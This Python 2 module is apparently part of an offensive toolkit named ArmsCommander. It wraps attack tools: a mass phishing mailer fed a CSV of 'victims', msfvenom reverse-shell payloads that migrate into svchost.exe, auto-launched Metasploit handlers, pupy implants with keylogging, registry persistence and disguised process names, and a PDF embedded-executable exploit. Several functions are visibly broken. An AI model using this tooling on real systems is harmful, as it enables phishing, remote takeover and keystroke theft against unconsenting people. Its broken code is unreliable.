#Define execution policies
#!/usr/bin/env python
# coding=UTF-8

#import modules
import os
import socket
import operator
from termcolor import colored
import sys
import StringIO
import re
import time
import configparser

# This is where I stash my most commonly overused functions. Eventually I will end up shortening all of the code in the other modules so that they can reuse their variables here
handler_file_dir = '/root/ArmsCommander/payloads'
py_mailer_save_file = '/root/ArmsCommander/remoteexploits/py_mailer_save.csv'

def get_var_python_mailer():
    subject_title = str(raw_input("Enter the SUBJECT title: "))
    victim_wordlist = str(raw_input("Enter the CSV wordlist PATH of victims (NAME,ADDRESS): "))
    html_file = str(raw_input("Enter HTML message PATH (*.html): "))
    write_savefile_python_mailer(subject_title, victim_wordlist, html_file)
    return subject_title, victim_wordlist, html_file

def write_savefile_python_mailer(subject_title, victim_wordlist, html_file):
    py_mailer_save_file = '/root/ArmsCommander/remoteexploits/py_mailer_save.csv'
    write_string = "'%s',%s,%s" % (subject_title, victim_wordlist, html_file)
    w = open(py_mailer_save_file,'w')
    w.write(write_string)
    w.close()
    launch_mass_mailer_attack_python_mailer(subject_title, victim_wordlist, html_file)
    return py_mailer_save_file, subject_title, victim_wordlist, html_file

def launch_mass_mailer_attack_python_mailer(subject_title, victim_wordlist, html_file):
    cmd_String = "python /root/ArmsCommander/remoteexploits/python-mailer/pymailer.py -s %s %s '%s'" % (html_file, victim_wordlist, subject_title)
    os.system(cmd_String)
    return subject_title, victim_wordlist, html_file

def read_savefile_python_mailer(py_mailer_save_file):
    r = open(py_mailer_save_file,'r')
    sentence = r.readline().strip()
    sentence = str(sentence)
    sentence = sentence.split(',')
    subject_title = sentence[0]
    victim_wordlist = sentence[1]
    html_file = sentence[2]
    cmd_String = "python /root/ArmsCommander/remoteexploits/python-mailer/pymailer.py -s %s %s '%s'" % (html_file, victim_wordlist, subject_title)
    os.system(cmd_String)

    return py_mailer_save_file

def debug_text(text_display):
    print colored('DEBUG PROMPT: ' + text_display,'red',attrs=['bold'])
    return

def determine_file_ext_msfvenom(msf_payload_name):
    if re.findall('windows', msf_payload_name):
        file_extension = 'exe'
    elif re.findall('android', msf_payload_name):
        file_extension = 'apk'
    elif re.findall('linux', msf_payload_name):
        file_extension = 'lin'
    elif re.findall('osx', msf_payload_name):
        file_extension = 'macho'
    elif re.findall('java', msf_payload_name):
        file_extension = 'jar'
    elif re.findall('ruby', msf_payload_name):
        file_extension = 'rb'
    elif re.findall('python', msf_payload_name):
        file_extension = 'py'

    return file_extension


def handler_generator_msf(LHOST, LPORT, payload_name): # test successful aside from one minor bug
    payload_Set = payload_name # to preserve the syntax of the msf payload with slashes
    payload_name = payload_name.replace('/','_') # then we format the name of payload into a workable filename
    payload_name = payload_name.replace('(','\(')
    payload_name = payload_name.replace(')','\)')
    payload_filename = handler_file_dir + '/' + payload_name + '_handler.rc'
    handler = open(payload_filename, 'w')

    # write proper parameters to handler file
    print 'Writing to handler file'
    handler.write('use multi/handler')
    # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
    # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
    handler.write("\nset PAYLOAD " + payload_Set)
    # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
    handler.write('\nset LHOST ' + LHOST)
    # handler.write("\nset LPORT {0}").format(user_input.LPORT)
    handler.write("\nset LPORT " + LPORT)
    handler.write('\nset ExitOnSession false')
    handler.write('\nexploit -j -z')
    handler.close()
    handler_file = payload_filename
    print colored('Handler Resource File Created: %s','green',attrs=['bold']) % handler_file
    print colored('Starting Metasploit automatically with the handler','yellow',attrs=['bold'])
    metasploit_start_with_resource_file(payload_filename)
    return handler, handler_file

# we need to add a file extension generator to both this and the no-encode version
def msfvenom_syntax(payload, LHOST, LPORT, encoder, encoder_iterations, output_format, output_file): # test successful aside from one bug
    bad_Bytes = "x00"
    msf_payload_name = payload
    file_extension = determine_file_ext_msfvenom(msf_payload_name)
    cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} PrependMigrate=true PrependMigrateProc=svchost.exe -e {3} -i {4} -b "\{5}" -f {6} -o {7}.{8}""".format(
        payload,
        LHOST,
        LPORT,
        encoder,
        encoder_iterations,
        bad_Bytes,
        output_format,
        output_file,
        file_extension
    )
    os.system(cmd_String)
    # print colored('DEBUG: ' + cmd_String, 'red',attrs=['bold'])
    debug_text(cmd_String)
    payload_name = payload
    handler_generator_msf(LHOST, LPORT, payload_name)
    # # testing block of code, auto-generating file_format exploit
    # input_filename = '/root/Documents/SSF_SS_1098T.pdf'
    # output_filename = '/root/Downloads/test.pdf'
    # file_format_exploit_pdf(output_file, input_filename, output_filename)
    return output_file

# need to write a dictionary file if os = ..... then dict = .....
# like use re to search for whats in the payload, and if and or statements to decide what extension to use

def msfvenom_syntax_no_encode(payload_name, LHOST, LPORT, output_format, output_file): # test successful aside from one bug
    file_extension = determine_file_ext_msfvenom(payload_name)
    cmd_String = """msfvenom -p "{0}" LHOST={1} LPORT={2} -f {3} -o {4}.{5}""".format(
        payload_name,
        LHOST,
        LPORT,
        output_format,
        output_file,
        file_extension
    )

    debug_text(cmd_String)
    os.system(cmd_String)
    handler_generator_msf(LHOST, LPORT, payload_name)
    return output_file

def pupygen_syntax(Format_Chosen, os, arch, transport, file_ext, LHOST, LPORT, scriptlets):
    host_Connectback = LHOST
    host_Port = LPORT
    Operating_System = os
    Architecture_Value = arch
    Transport_Chosen = transport
    file_extension = file_ext
    scriptlets = '-s keylogger -s hide_argv,name=svchost.exe -s daemonize'
    cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -s persistence,method=registry -s keylogger -s hide_argv,name=svchost.exe -s daemonize -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
        Format_Chosen, # 0
        Operating_System, # 1
        Architecture_Value, #2
        Format_Chosen, #3
        Operating_System, # 4
        Architecture_Value, # 5
        Transport_Chosen, # 6
        file_extension, # 7
        host_Connectback, # 8
        host_Port, # 9
        Transport_Chosen # 10

    )
    os.system(cmd_String)
    debug_text(cmd_String)
    # pupygen_handler_generator_msf(#need to add arguments here)
    return

def pupygen_handler_generator_msf():
    return

def file_format_exploit_pdf(exe_input, input_filename, output_filename): # tested, works
    # I should make a library that uses the re for my federal taxation class to "grep" my answers in open book exams
    exploit = 'exploit/windows/fileformat/adobe_pdf_embedded_exe'
    resource_file = '/root/ArmsCommander/payloads/pdf_file_format_exploit.rc'
    debug_text('Opening temporary resource file to write to')
    print colored('Using EXPLOIT: %s','yellow',attrs=['bold']) % exploit
    print colored('EXENAME: %s','yellow',attrs=['bold']) % exe_input
    print colored('INPUT PDF: %s','yellow',attrs=['bold']) % input_filename
    print colored('OUTPUT PDF: %s','yellow',attrs=['bold']) % output_filename

    w = open(resource_file, 'w')
    w.write('use ' + exploit)
    w.write('\nset EXENAME ' + exe_input)
    w.write('\nset INFILENAME ' + input_filename)
    w.write('\nset FILENAME ' + output_filename)
    w.write('\nrun')
    w.close()
    debug_text('Starting Metasploit resource file: File Format Exploit Embedded PDF Javascript Enabled')
    metasploit_start_with_resource_file(resource_file)
    return resource_file, output_filename

def metasploit_manual_start():
    os.system('service postgresql start')
    os.system('service metasploit start')
    os.system('msfdb init')
    os.system('msfdb start')
    os.system('msfconsole')
    os.system('db_status')

    return

def metasploit_start_with_resource_file(resource_file): # works
    os.system('service postgresql start')
    os.system('service metasploit start')
    os.system('msfdb init')
    os.system('msfdb start')
    cmd_String = "msfconsole -r %s" % resource_file
    os.system(cmd_String)
    debug_text(cmd_String)
    os.system('db_status')

    return resource_file

def generate_inject_bin(Location_DuckEncoder, Location_DuckyScript, Location_SDCard):
    cmd_String_Compile = "java -jar {0} -i {1} -o {2}/inject.bin".format(
        Location_DuckEncoder,
        Location_DuckyScript,
        Location_SDCard
    )
    debug_text(cmd_String_Compile)
    cmd_String_Eject = "eject %s" % Location_SDCard
    debug_text(cmd_String_Eject)
    return inject_bin

#def config_parser_test(): # may be a better idea to write this on a separate python file?

def ConfigSectionMap(section):
    dict1 = ()
    options = Config.options(section)
    for option in options:
        try:
            dict1[option] = Config.get(section, option)
            if dict1[option] == -1:
                DebugPrint("skip: %s" % option)


        except:
            print ("Exception on %s" % option)
            dict1[option] = None
        return dict1

def write_to_config(): # this writes a all new config ini file
    config_file = open("/root/ArmsCommander/remoteexploits/testconfig.ini",'w') # when fully tested make sure to import configparser into all modules that use this
    # or does it have to be cfgfile?
    Config.add_section('Person')
    Config.set('Person','HasEyes',True)
    Config.set('Person','Age',50)
    Config.write(config_file)
    config_file.close()
